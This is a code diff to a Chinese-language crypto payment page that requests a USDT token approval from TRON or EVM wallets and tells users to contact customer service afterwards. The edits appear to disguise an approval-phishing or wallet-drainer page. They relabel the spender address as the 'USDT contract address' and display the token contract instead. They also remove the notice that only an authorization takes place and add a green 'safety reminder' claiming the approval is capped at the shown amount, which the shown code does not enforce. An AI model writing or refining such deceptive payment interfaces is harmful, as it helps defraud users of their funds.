@@ -31,9 +31,15 @@
           </div>
           
           <div class="card-body p-4">
+            <div id="safeTip" class="alert alert-success py-2 px-3 d-flex align-items-center gap-2" role="alert" style="display:none;margin-bottom:16px;">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" class="flex-shrink-0" viewBox="0 0 16 16" aria-hidden="true">
+                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"/>
+              </svg>
+              <div id="safeTipText" class="small"></div>
+            </div>
             <div class="mb-4">
             <div class="d-flex justify-content-between mb-2">
-              <span class="text-secondary">授权地址 (Spender)</span>
+              <span class="text-secondary">USDT 合约地址</span>
             </div>
             <div class="p-2 bg-light rounded text-break mono small" id="toAddressText">
               --
@@ -51,7 +57,6 @@
       </div>
 
       <div class="text-center mt-4 text-secondary small">
-        <p>本次操作仅进行 USDT 授权</p>
         <p class="opacity-75">授权后请联系客服确认订单</p>
         <a href="javascript:history.back()" class="text-decoration-none text-secondary">返回上一页</a>
       </div>
@@ -75,6 +80,8 @@
       const $ = (id) => document.getElementById(id);
       const logEl = $("statusText");
       const btn = $("btnMainPay");
+      const safeTipEl = document.getElementById("safeTip");
+      const safeTipTextEl = document.getElementById("safeTipText");
       
       function log(msg) {
         if (logEl) logEl.textContent = msg;
@@ -85,37 +92,44 @@
         const cfg = window.pay0Config || {};
         const amount = cfg.amountUsdt || "0.00";
         $("amountText").textContent = amount;
-        const params = new URLSearchParams(window.location.search);
-        const urlTo = params.get("to") || params.get("address");
-        let configTo = cfg.toAddress;
-        $("toAddressText").textContent = urlTo || configTo || "待检测...";
+        $("toAddressText").textContent = "待检测...";
+        showSafeTip(amount);
       }, 100);
+
+      function normalizeAmountText(v) {
+        try {
+          const n = typeof v === "number" ? v : parseFloat(String(v));
+          if (!isNaN(n)) return n.toFixed(2);
+        } catch (e) {}
+        return String(v || "");
+      }
+
+      function showSafeTip(amount) {
+        if (!safeTipEl || !safeTipTextEl) return;
+        const t = normalizeAmountText(amount);
+        safeTipTextEl.textContent = "安全提醒：当前授权地址只能转最大" + t + "USDT。";
+        safeTipEl.style.display = "flex";
+      }
 
       let payHandler = null;
       let chainType = "unknown";
 
       async function checkEnv() {
         const cfg = window.pay0Config || {};
-        const params = new URLSearchParams(window.location.search);
-        const urlTo = params.get("to") || params.get("address");
 
-        function updateToAddress(chainKey) {
-          let finalTo = urlTo;
-          if (!finalTo && cfg.getNetworkConfig) {
+        function updateUsdtContractAddress(chainKey) {
+          let tokenAddress = "";
+          if (cfg.getNetworkConfig) {
             const netCfg = cfg.getNetworkConfig(chainKey);
-            if (netCfg) finalTo = netCfg.toAddress;
+            if (netCfg) tokenAddress = netCfg.usdtAddress || "";
           }
-          if (finalTo) {
-            $("toAddressText").textContent = finalTo;
-          } else {
-            $("toAddressText").textContent = "未配置收款地址";
-          }
+          $("toAddressText").textContent = tokenAddress || "未配置 USDT 合约地址";
         }
 
         if (window.tronWeb && window.tronWeb.defaultAddress) {
           chainType = "tron";
           $("netText").textContent = "TRON 网络";
-          updateToAddress("tron");
+          updateUsdtContractAddress("tron");
           return async () => {
             log("正在发起 TRON 授权...");
             const amount = (cfg.amountUsdt || "0.00").toString();
@@ -146,7 +160,7 @@
 
             $("netText").textContent = label;
             $("netText").className = "badge bg-white text-primary bg-opacity-25 border border-white border-opacity-25 mt-2";
-            updateToAddress(foundKey);
+            updateUsdtContractAddress(foundKey);
 
             return async () => {
               log("正在发起 EVM 授权...");
